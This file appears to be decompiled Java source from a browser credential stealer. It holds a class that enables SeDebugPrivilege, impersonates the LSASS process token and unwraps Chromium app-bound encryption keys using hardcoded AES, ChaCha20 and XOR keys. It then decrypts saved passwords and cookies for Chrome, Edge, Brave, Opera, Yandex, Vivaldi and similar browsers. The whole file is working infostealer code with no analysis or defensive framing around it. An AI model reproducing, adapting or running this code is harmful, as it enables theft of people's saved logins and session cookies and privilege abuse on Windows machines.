/*
 * Decompiled with CFR 0.152.
 */
package aether.browser;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.Library;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.Crypt32Util;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.Key;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public final class DpapiDecryptor {
    private static final byte[] a = DpapiDecryptor.c("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787");
    private static final byte[] b = DpapiDecryptor.c("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660");
    private static final byte[] c = DpapiDecryptor.c("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390");
    private static boolean d = false;

    private static byte[] a(byte[] byArray) {
        try {
            return Crypt32Util.cryptUnprotectData(byArray);
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static void a() {
        try {
            Object object = new PointerByReference();
            boolean bl = RawAdv32.INSTANCE.OpenProcessToken(Kernel32.INSTANCE.GetCurrentProcess(), 40, (PointerByReference)object);
            String string = "enableSeDEbug OpenProcessToken=" + bl;
            if (!bl) {
                return;
            }
            object = ((PointerByReference)object).getValue();
            try {
                Memory memory = new Memory(8L);
                boolean bl2 = RawAdv32.INSTANCE.LookupPrivilegeValueW(null, new WString("SeDebugPrivilege"), memory);
                string = "LookupPrivilegeValueW=" + bl2 + " lowPart=" + ((Pointer)memory).getInt(0L);
                if (!bl2) {
                    return;
                }
                Memory memory2 = new Memory(16L);
                ((Pointer)memory2).setInt(0L, 1);
                ((Pointer)memory2).setInt(4L, ((Pointer)memory).getInt(0L));
                ((Pointer)memory2).setInt(8L, ((Pointer)memory).getInt(4L));
                ((Pointer)memory2).setInt(12L, 2);
                boolean bl3 = RawAdv32.INSTANCE.AdjustTokenPrivileges((Pointer)object, false, memory2, 0, null, null);
                string = "AdjustTokenPrivileges=" + bl3 + " lastErr=" + Kernel32.INSTANCE.GetLastError();
            }
            finally {
                Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE((Pointer)object));
            }
        }
        catch (Throwable throwable) {
            String string = "enableSeDebugPrivilege ex: " + throwable.getClass().getName() + ": " + throwable.getMessage();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static int b() {
        try {
            WinNT.HANDLE hANDLE = Kernel32.INSTANCE.CreateToolhelp32Snapshot(Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0L));
            if (hANDLE == null) return -1;
            if (WinBase.INVALID_HANDLE_VALUE.equals(hANDLE)) {
                return -1;
            }
            try {
                Tlhelp32.PROCESSENTRY32 pROCESSENTRY32 = new Tlhelp32.PROCESSENTRY32();
                new Tlhelp32.PROCESSENTRY32().dwSize = new WinDef.DWORD((long)pROCESSENTRY32.size());
                if (!Kernel32.INSTANCE.Process32First(hANDLE, pROCESSENTRY32)) {
                    return -1;
                }
                do {
                    if (!"lsass.exe".equalsIgnoreCase(Native.toString(pROCESSENTRY32.szExeFile).trim())) continue;
                    int n2 = pROCESSENTRY32.th32ProcessID.intValue();
                    return n2;
                } while (Kernel32.INSTANCE.Process32Next(hANDLE, pROCESSENTRY32));
                return -1;
            }
            finally {
                Kernel32.INSTANCE.CloseHandle(hANDLE);
            }
        }
        catch (Exception exception) {}
        return -1;
    }

    /*
     * Loose catch block
     */
    private static byte[] b(byte[] byArray) {
        boolean bl;
        Pointer pointer;
        Pointer pointer2;
        WinNT.HANDLE hANDLE;
        String string;
        block66: {
            byte[] byArray2;
            block67: {
                Object object;
                block64: {
                    block65: {
                        boolean bl2;
                        block62: {
                            block63: {
                                block60: {
                                    byte[] byArray3;
                                    block61: {
                                        DpapiDecryptor.a();
                                        int n2 = DpapiDecryptor.b();
                                        string = "lsassPid=" + n2;
                                        if (n2 <= 0) {
                                            string = "lsass not found, plain dpapi";
                                            return DpapiDecryptor.a(byArray);
                                        }
                                        hANDLE = null;
                                        pointer2 = null;
                                        pointer = null;
                                        bl = false;
                                        hANDLE = Kernel32.INSTANCE.OpenProcess(1024, false, n2);
                                        n2 = Kernel32.INSTANCE.GetLastError();
                                        string = "OpenProcess(LSASS)=" + hANDLE + " err=" + n2;
                                        if (hANDLE != null) break block60;
                                        string = "OpenProcess failed err=" + n2;
                                        byArray3 = DpapiDecryptor.a(byArray);
                                        if (hANDLE == null) break block61;
                                        try {
                                            Kernel32.INSTANCE.CloseHandle(hANDLE);
                                        }
                                        catch (Throwable throwable) {}
                                    }
                                    return byArray3;
                                }
                                object = new PointerByReference();
                                bl2 = RawAdv32.INSTANCE.OpenProcessToken(hANDLE, 10, (PointerByReference)object);
                                string = "OpenProcessToken=" + bl2 + " err=" + Kernel32.INSTANCE.GetLastError();
                                if (bl2) break block62;
                                object = DpapiDecryptor.a(byArray);
                                if (hANDLE == null) break block63;
                                try {
                                    Kernel32.INSTANCE.CloseHandle(hANDLE);
                                }
                                catch (Throwable throwable) {}
                            }
                            return object;
                        }
                        pointer2 = ((PointerByReference)object).getValue();
                        object = new PointerByReference();
                        bl2 = RawAdv32.INSTANCE.DuplicateTokenEx(pointer2, 12, null, 2, 2, (PointerByReference)object);
                        string = "DuplicateTokenEx=" + bl2 + " err=" + Kernel32.INSTANCE.GetLastError();
                        if (bl2) break block64;
                        object = DpapiDecryptor.a(byArray);
                        if (pointer2 == null) break block65;
                        try {
                            Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer2));
                        }
                        catch (Throwable throwable) {}
                    }
                    if (hANDLE != null) {
                        try {
                            Kernel32.INSTANCE.CloseHandle(hANDLE);
                        }
                        catch (Throwable throwable) {}
                    }
                    return object;
                }
                pointer = ((PointerByReference)object).getValue();
                boolean bl3 = RawAdv32.INSTANCE.ImpersonateLoggedOnUser(pointer);
                string = "ImpersonateLoggedOnUser=" + bl3 + " err=" + Kernel32.INSTANCE.GetLastError();
                if (bl3) break block66;
                byArray2 = DpapiDecryptor.a(byArray);
                if (pointer == null) break block67;
                try {
                    Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer));
                }
                catch (Throwable throwable) {}
            }
            if (pointer2 != null) {
                try {
                    Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer2));
                }
                catch (Throwable throwable) {}
            }
            if (hANDLE != null) {
                try {
                    Kernel32.INSTANCE.CloseHandle(hANDLE);
                }
                catch (Throwable throwable) {}
            }
            return byArray2;
        }
        bl = true;
        byte[] byArray4 = DpapiDecryptor.a(byArray);
        string = "dpapi(lsass)=" + (byArray4 != null ? byArray4.length + " bytes" : "null");
        try {
            RawAdv32.INSTANCE.RevertToSelf();
        }
        catch (Throwable throwable) {}
        if (pointer != null) {
            try {
                Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer));
            }
            catch (Throwable throwable) {}
        }
        if (pointer2 != null) {
            try {
                Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer2));
            }
            catch (Throwable throwable) {}
        }
        if (hANDLE != null) {
            try {
                Kernel32.INSTANCE.CloseHandle(hANDLE);
            }
            catch (Throwable throwable) {}
        }
        return byArray4;
        catch (Throwable throwable) {
            byte[] byArray5;
            block68: {
                try {
                    string = "dpapiWithLsass exception: " + throwable.getClass().getName() + ": " + throwable.getMessage();
                    byArray5 = DpapiDecryptor.a(byArray);
                    if (!bl) break block68;
                }
                catch (Throwable throwable2) {
                    if (bl) {
                        try {
                            RawAdv32.INSTANCE.RevertToSelf();
                        }
                        catch (Throwable throwable3) {}
                    }
                    if (pointer != null) {
                        try {
                            Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer));
                        }
                        catch (Throwable throwable4) {}
                    }
                    if (pointer2 != null) {
                        try {
                            Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer2));
                        }
                        catch (Throwable throwable5) {}
                    }
                    if (hANDLE != null) {
                        try {
                            Kernel32.INSTANCE.CloseHandle(hANDLE);
                        }
                        catch (Throwable throwable6) {}
                    }
                    throw throwable2;
                }
                try {
                    RawAdv32.INSTANCE.RevertToSelf();
                }
                catch (Throwable throwable7) {}
            }
            if (pointer != null) {
                try {
                    Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer));
                }
                catch (Throwable throwable8) {}
            }
            if (pointer2 != null) {
                try {
                    Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer2));
                }
                catch (Throwable throwable9) {}
            }
            if (hANDLE != null) {
                try {
                    Kernel32.INSTANCE.CloseHandle(hANDLE);
                }
                catch (Throwable throwable10) {}
            }
            return byArray5;
        }
    }

    private static byte[] a(byte[] byArray, String object, int n2) {
        PointerByReference pointerByReference = new PointerByReference();
        PointerByReference pointerByReference2 = new PointerByReference();
        try {
            int n3 = NcryptLib.INSTANCE.NCryptOpenStorageProvider(pointerByReference, new WString("Microsoft Software Key Storage Provider"), 0);
            if (n3 != 0) {
                object = "NCryptOpenProvider err=" + n3;
                return null;
            }
            n3 = NcryptLib.INSTANCE.NCryptOpenKey(pointerByReference.getValue(), pointerByReference2, new WString((String)object), 0, n2);
            if (n3 != 0) {
                NcryptLib.INSTANCE.NCryptFreeObject(pointerByReference.getValue());
                return null;
            }
            object = "NCryptOpenKey OK name=" + (String)object + " flags=" + n2;
            object = new IntByReference();
            if (NcryptLib.INSTANCE.NCryptDecrypt(pointerByReference2.getValue(), byArray, byArray.length, null, null, 0, (IntByReference)object, 64) != 0) {
                NcryptLib.INSTANCE.NCryptFreeObject(pointerByReference2.getValue());
                NcryptLib.INSTANCE.NCryptFreeObject(pointerByReference.getValue());
                return null;
            }
            byte[] byArray2 = new byte[((IntByReference)object).getValue()];
            int n4 = NcryptLib.INSTANCE.NCryptDecrypt(pointerByReference2.getValue(), byArray, byArray.length, null, byArray2, ((IntByReference)object).getValue(), (IntByReference)object, 64);
            NcryptLib.INSTANCE.NCryptFreeObject(pointerByReference2.getValue());
            NcryptLib.INSTANCE.NCryptFreeObject(pointerByReference.getValue());
            if (n4 == 0) {
                return Arrays.copyOf(byArray2, ((IntByReference)object).getValue());
            }
            return null;
        }
        catch (Exception exception) {
            try {
                NcryptLib.INSTANCE.NCryptFreeObject(pointerByReference2.getValue());
            }
            catch (Exception exception2) {}
            try {
                NcryptLib.INSTANCE.NCryptFreeObject(pointerByReference.getValue());
            }
            catch (Exception exception3) {}
            return null;
        }
    }

    private static List<String> c(byte[] object) {
        ArrayList<String> arrayList = new ArrayList<String>();
        try {
            String string = new String((byte[])object, "UTF-8").replaceAll("[\\x00-\\x0f]", "");
            object = string;
            object = string.replace('\\', '/').split("/");
            for (int i2 = 0; i2 < ((byte[])object).length; ++i2) {
                String string2 = object[i2].toLowerCase();
                if (!string2.equals("program files") && !string2.equals("program files (x86)") && !string2.equals("programs")) continue;
                if (i2 + 2 < ((byte[])object).length) {
                    string2 = (String)object[i2 + 1] + " " + (String)object[i2 + 2];
                    arrayList.add(string2 + "key1");
                    arrayList.add(string2);
                    arrayList.add((String)object[i2 + 2] + "key1");
                    arrayList.add((String)object[i2 + 2]);
                    arrayList.add((String)object[i2 + 1] + "key1");
                    arrayList.add((String)object[i2 + 1]);
                }
                break;
            }
        }
        catch (Exception exception) {}
        arrayList.addAll(Arrays.asList("Google Chromekey1", "Google Chrome", "Microsoft Edgekey1", "Microsoft Edge", "BraveSoftware Brave-Browserkey1", "BraveSoftware Brave-Browser", "Brave-Browserkey1", "Brave-Browser", "Brave Browserkey1", "Brave Browser", "Brave Softwarekey1", "Brave Software", "Opera Softwarekey1", "Opera Software", "Opera Stablekey1", "Opera Stable", "Opera GX Stablekey1", "Opera GX Stable", "Yandex YandexBrowserkey1", "Yandex YandexBrowser", "Yandexkey1", "Yandex", "Vivaldi Vivaldikey1", "Vivaldikey1", "Vivaldi", "CentBrowserkey1", "CentBrowser", "Chrome", "Chromium", "Chromiumkey1"));
        return arrayList;
    }

    private static Pointer c() {
        try {
            DpapiDecryptor.a();
            int n2 = DpapiDecryptor.b();
            if (n2 <= 0) {
                return null;
            }
            Object object = Kernel32.INSTANCE.OpenProcess(1024, false, n2);
            if (object == null) {
                return null;
            }
            PointerByReference pointerByReference = new PointerByReference();
            boolean bl = RawAdv32.INSTANCE.OpenProcessToken((WinNT.HANDLE)object, 10, pointerByReference);
            Kernel32.INSTANCE.CloseHandle((WinNT.HANDLE)object);
            if (!bl) {
                return null;
            }
            object = pointerByReference.getValue();
            pointerByReference = new PointerByReference();
            bl = RawAdv32.INSTANCE.DuplicateTokenEx((Pointer)object, 12, null, 2, 2, pointerByReference);
            Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE((Pointer)object));
            if (!bl) {
                return null;
            }
            object = pointerByReference.getValue();
            if (!RawAdv32.INSTANCE.ImpersonateLoggedOnUser((Pointer)object)) {
                Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE((Pointer)object));
                return null;
            }
            return object;
        }
        catch (Throwable throwable) {
            String string = "acquireLsassImpToken ex: " + throwable.getClass().getName() + ": " + throwable.getMessage();
            return null;
        }
    }

    private static void a(Pointer pointer) {
        try {
            RawAdv32.INSTANCE.RevertToSelf();
        }
        catch (Throwable throwable) {}
        if (pointer != null) {
            try {
                Kernel32.INSTANCE.CloseHandle(new WinNT.HANDLE(pointer));
                return;
            }
            catch (Throwable throwable) {}
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static byte[] a(byte[] var0, List<String> var1_2, byte[] var2_3) {
        block12: {
            block9: {
                block10: {
                    block11: {
                        var3_4 = DpapiDecryptor.c();
                        try {
                            var1_2 = var1_2.iterator();
                            while (var1_2.hasNext()) {
                                var4_5 = (String)var1_2.next();
                                var5_6 = new int[]{0, 32, 64, 96};
                                var5_6.length;
                                var6_7 = 0;
lbl10:
                                // 2 sources

                                while (var6_7 < 4) {
                                    var7_9 = var5_6[var6_7];
                                    var7_8 = DpapiDecryptor.a(var0, var4_5, var7_9);
                                    if (var7_8 == null) break block9;
                                    var8_10 = DpapiDecryptor.c;
                                    var9_11 = Math.min(var7_8.length, var8_10.length);
                                    var10_12 = new byte[var9_11];
                                    for (var11_13 = 0; var11_13 < var9_11; ++var11_13) {
                                        var10_12[var11_13] = (byte)(var7_8[var11_13] ^ var8_10[var11_13]);
                                    }
                                    var7_8 = var10_12;
                                    if (var2_3 != null && var7_8.length == 32) {
                                        try {
                                            var0 = Arrays.copyOfRange(var2_3, 0, 12);
                                            v0 = Arrays.copyOfRange(var2_3, 12, var2_3.length);
                                            var1_2 = v0;
                                            var0 = DpapiDecryptor.c(v0, var7_8, var0);
                                            if (var0 == null) break block10;
                                            break block11;
                                        }
                                        catch (Exception v1) {
                                            var1_2 = var7_8;
                                            DpapiDecryptor.a(var3_4);
                                            return var1_2;
                                        }
                                    }
                                    ** GOTO lbl-1000
                                }
                            }
                            break block12;
                        }
                        catch (Throwable var0_1) {
                            DpapiDecryptor.a(var3_4);
                            throw var0_1;
                        }
                    }
                    DpapiDecryptor.a(var3_4);
                    return var0;
                }
                var0 = var7_8;
                DpapiDecryptor.a(var3_4);
                return var0;
lbl-1000:
                // 1 sources

                {
                    if (var7_8.length != 32) break block9;
                    var0 = var7_8;
                }
                DpapiDecryptor.a(var3_4);
                return var0;
            }
            ++var6_7;
            ** GOTO lbl10
        }
        DpapiDecryptor.a(var3_4);
        return null;
    }

    private static byte[] d(byte[] object) {
        if (object == null || ((byte[])object).length < 10) {
            return null;
        }
        try {
            ByteBuffer byteBuffer = ByteBuffer.wrap(object).order(ByteOrder.LITTLE_ENDIAN);
            int n2 = byteBuffer.getInt(0);
            int n3 = n2 + 4;
            String string = "parseABEBlob: blobLen=" + ((byte[])object).length + " hlen=" + n2 + " dlenPos=" + n3;
            if (n3 + 4 > ((byte[])object).length) {
                string = "dlenPos OOB";
                return null;
            }
            int n4 = byteBuffer.getInt(n3);
            string = "dlen=" + n4 + " total needed=" + (n3 + 4 + n4);
            if (n3 + 4 + n4 > ((byte[])object).length) {
                string = "dlen OOB";
                return null;
            }
            byte[] byArray = Arrays.copyOfRange(object, 4, n3);
            byte[] byArray2 = Arrays.copyOfRange(object, n3 + 4, n3 + 4 + n4);
            if (byArray2.length == 0) {
                return null;
            }
            int n5 = byArray2[0] & 0xFF;
            byArray2 = Arrays.copyOfRange(byArray2, 1, byArray2.length);
            string = "flag=" + n5 + " payloadLen=" + byArray2.length;
            if (n5 == 1) {
                if (byArray2.length < 28) {
                    string = "flag1 payload too short";
                    return null;
                }
                object = Arrays.copyOfRange(byArray2, 0, 12);
                byte[] byArray3 = Arrays.copyOfRange(byArray2, 12, byArray2.length);
                byArray = DpapiDecryptor.c(byArray3, a, object);
                string = "flag1 aesGcm=" + (byArray != null ? byArray.length + "b" : "null");
                return byArray;
            }
            if (n5 == 2) {
                if (byArray2.length < 28) {
                    string = "flag2 payload too short";
                    return null;
                }
                object = Arrays.copyOfRange(byArray2, 0, 12);
                byte[] byArray4 = Arrays.copyOfRange(byArray2, 12, byArray2.length);
                byArray = DpapiDecryptor.d(byArray4, b, object);
                string = "flag2 chacha=" + (byArray != null ? byArray.length + "b" : "null");
                return byArray;
            }
            if (n5 == 3) {
                object = DpapiDecryptor.c(byArray);
                if (n4 > 60) {
                    byte[] byArray5 = Arrays.copyOfRange(byArray2, 0, byArray2.length - 60);
                    byArray = Arrays.copyOfRange(byArray2, byArray2.length - 60, byArray2.length);
                    return DpapiDecryptor.a(byArray5, (List<String>)object, byArray);
                }
                return DpapiDecryptor.a(byArray2, (List<String>)object, null);
            }
            if (((byte[])object).length >= 32) {
                return Arrays.copyOfRange(object, ((byte[])object).length - 32, ((byte[])object).length);
            }
        }
        catch (Exception exception) {}
        return null;
    }

    public static byte[] a(String object) {
        try {
            Object object2 = new String(Files.readAllBytes(Paths.get((String)object, new String[0])));
            object2 = JsonParser.parseString((String)object2).getAsJsonObject();
            object2 = ((JsonObject)object2).getAsJsonObject("os_crypt");
            if (object2 == null) {
                String string = "no os_crypt in " + (String)object;
                return null;
            }
            if ((object2 = ((JsonObject)object2).has("app_bound_encrypted_key") ? ((JsonObject)object2).get("app_bound_encrypted_key").getAsString() : null) == null || ((String)object2).isEmpty()) {
                String string = "no app_bound_encrypted_key in " + (String)object;
                return null;
            }
            String string = "app_bound_encrypted_key found len=" + ((String)object2).length();
            object = Base64.getDecoder().decode((String)object2);
            string = "blob len=" + ((Object)object).length + " prefix=" + new String(Arrays.copyOfRange((byte[])object, 0, Math.min(4, ((Object)object).length)));
            if (((Object)object).length <= 4) {
                return null;
            }
            byte[] byArray = Arrays.copyOfRange((byte[])object, 4, ((Object)object).length);
            object = byArray;
            object = DpapiDecryptor.b(byArray);
            string = "first DPAPI (lsass): " + (object != null ? ((Object)object).length + " bytes" : "null");
            if (object == null) {
                return null;
            }
            object = DpapiDecryptor.a((byte[])object);
            string = "second DPAPI (user): " + (object != null ? ((Object)object).length + " bytes" : "null");
            if (object == null) {
                return null;
            }
            object = DpapiDecryptor.d((byte[])object);
            string = "parseABEBlob: " + (object != null ? ((Object)object).length + " bytes" : "null");
            return object;
        }
        catch (Throwable throwable) {
            String string = "getMasterKeyV20 exception: " + throwable.getClass().getName() + ": " + throwable.getMessage();
            return null;
        }
    }

    public static byte[] b(String object) {
        try {
            object = new String(Files.readAllBytes(Paths.get((String)object, new String[0])));
            object = JsonParser.parseString((String)object).getAsJsonObject();
            object = ((JsonObject)object).getAsJsonObject("os_crypt").get("encrypted_key").getAsString();
            byte[] byArray = Base64.getDecoder().decode((String)object);
            object = byArray;
            byte[] byArray2 = Arrays.copyOfRange(byArray, 5, ((Object)object).length);
            object = byArray2;
            byte[] byArray3 = DpapiDecryptor.a(byArray2);
            object = byArray3;
            if (byArray3 != null && ((Object)object).length >= 32) {
                return Arrays.copyOf((byte[])object, 32);
            }
            return object;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String a(byte[] byArray, byte[] byArray2, byte[] byArray3) {
        return DpapiDecryptor.a(byArray, byArray2, byArray3, false);
    }

    public static String b(byte[] byArray, byte[] byArray2, byte[] byArray3) {
        return DpapiDecryptor.a(byArray, byArray2, byArray3, true);
    }

    public static String a(byte[] byArray, byte[] byArray2) {
        byte[] byArray3 = null;
        return DpapiDecryptor.a(byArray, byArray2, byArray3, false);
    }

    private static String a(byte[] byArray, byte[] byArray2, byte[] byArray3, boolean bl) {
        try {
            if (byArray == null || byArray.length < 15) {
                return "";
            }
            Object object = new String(Arrays.copyOfRange(byArray, 0, 3), "UTF-8");
            if (!(((String)object).equals("v10") || ((String)object).equals("v11") || ((String)object).equals("v20"))) {
                byte[] byArray4 = DpapiDecryptor.a(byArray);
                object = byArray4;
                if (byArray4 != null) {
                    return new String((byte[])object, "UTF-8");
                }
                return "";
            }
            boolean bl2 = ((String)object).equals("v20");
            byte[] byArray5 = bl2 ? (byArray3 != null ? byArray3 : byArray2) : (byArray3 = byArray2);
            if (byArray5 == null) {
                return "";
            }
            byte[] byArray6 = Arrays.copyOfRange(byArray, 3, 15);
            byArray = Arrays.copyOfRange(byArray, 15, byArray.length);
            byte[] byArray7 = null;
            try {
                byArray7 = DpapiDecryptor.c(byArray, byArray3, byArray6);
            }
            catch (Exception exception) {}
            if (byArray7 == null && bl2 && byArray2 != null && !Arrays.equals(byArray3, byArray2)) {
                try {
                    byArray7 = DpapiDecryptor.c(byArray, byArray2, byArray6);
                }
                catch (Exception exception) {}
            }
            if (byArray7 == null) {
                return "";
            }
            if (bl && bl2 && byArray7.length > 32) {
                byArray7 = Arrays.copyOfRange(byArray7, 32, byArray7.length);
            }
            if (bl && !bl2 && byArray7.length > 32 && DpapiDecryptor.e(byArray = Arrays.copyOfRange(byArray7, 32, byArray7.length)) < DpapiDecryptor.e(byArray7)) {
                byArray7 = byArray;
            }
            return new String(byArray7, "UTF-8");
        }
        catch (Exception exception) {
            return "";
        }
    }

    private static byte[] c(byte[] byArray, byte[] byArray2, byte[] byArray3) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(2, (Key)new SecretKeySpec(byArray2, "AES"), new GCMParameterSpec(128, byArray3));
            return cipher.doFinal(byArray);
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static byte[] d(byte[] byArray, byte[] byArray2, byte[] byArray3) {
        try {
            Cipher cipher = Cipher.getInstance("ChaCha20-Poly1305");
            cipher.init(2, (Key)new SecretKeySpec(byArray2, "ChaCha20"), new IvParameterSpec(byArray3));
            return cipher.doFinal(byArray);
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static byte[] c(String string) {
        int n2 = string.length();
        byte[] byArray = new byte[n2 / 2];
        for (int i2 = 0; i2 < n2; i2 += 2) {
            byArray[i2 / 2] = (byte)((Character.digit(string.charAt(i2), 16) << 4) + Character.digit(string.charAt(i2 + 1), 16));
        }
        return byArray;
    }

    private static int e(byte[] byArray) {
        int n2 = 0;
        int n3 = Math.min(byArray.length, 64);
        for (int i2 = 0; i2 < n3; ++i2) {
            int n4 = byArray[i2] & 0xFF;
            if (n4 >= 32 && n4 <= 126) continue;
            ++n2;
        }
        return n2;
    }

    static interface RawAdv32
    extends Library {
        public static final RawAdv32 INSTANCE = Native.load("advapi32", RawAdv32.class);

        public boolean OpenProcessToken(WinNT.HANDLE var1, int var2, PointerByReference var3);

        public boolean LookupPrivilegeValueW(String var1, WString var2, Memory var3);

        public boolean AdjustTokenPrivileges(Pointer var1, boolean var2, Memory var3, int var4, Pointer var5, Pointer var6);

        public boolean DuplicateTokenEx(Pointer var1, int var2, Pointer var3, int var4, int var5, PointerByReference var6);

        public boolean ImpersonateLoggedOnUser(Pointer var1);

        public boolean RevertToSelf();
    }

    static interface NcryptLib
    extends Library {
        public static final NcryptLib INSTANCE = Native.load("ncrypt", NcryptLib.class);

        public int NCryptOpenStorageProvider(PointerByReference var1, WString var2, int var3);

        public int NCryptOpenKey(Pointer var1, PointerByReference var2, WString var3, int var4, int var5);

        public int NCryptDecrypt(Pointer var1, byte[] var2, int var3, Pointer var4, byte[] var5, int var6, IntByReference var7, int var8);

        public int NCryptFreeObject(Pointer var1);
    }
}

